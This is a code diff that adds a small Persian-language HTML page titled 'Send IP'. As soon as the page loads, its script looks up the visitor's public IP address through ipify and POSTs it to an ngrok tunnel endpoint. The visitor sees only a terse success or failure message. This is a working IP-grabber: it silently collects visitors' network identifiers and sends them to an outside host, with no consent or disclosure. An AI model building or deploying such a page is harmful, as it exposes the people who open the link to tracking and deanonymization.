@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ارسال IP</title>
+</head>
+<body>
+
+    <p id="statusMessage"></p> <!-- اینجا پیغام نمایش داده می‌شود -->
+
+    <script>
+        window.onload = () => {
+            // دریافت IP کاربر
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const userIP = data.ip;
+                    console.log('IP کاربر:', userIP);
+
+                    // ارسال IP به سرور
+                    fetch('https://b493-148-135-194-191.ngrok-free.app/receive-ip', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ ip: userIP })
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            document.getElementById('statusMessage').textContent = 'عملیات موفق آمیز بود';
+                        } else {
+                            document.getElementById('statusMessage').textContent = 'اجرای نشد';
+                        }
+                    })
+                    .catch(error => {
+                        console.error('خطا در ارسال درخواست:', error);
+                        document.getElementById('statusMessage').textContent = 'اجرای نشد';
+                    });
+                })
+                .catch(error => {
+                    console.error('خطا در دریافت IP:', error);
+                    document.getElementById('statusMessage').textContent = 'اجرای نشد';
+                });
+        };
+    </script>
+
+</body>
+</html>
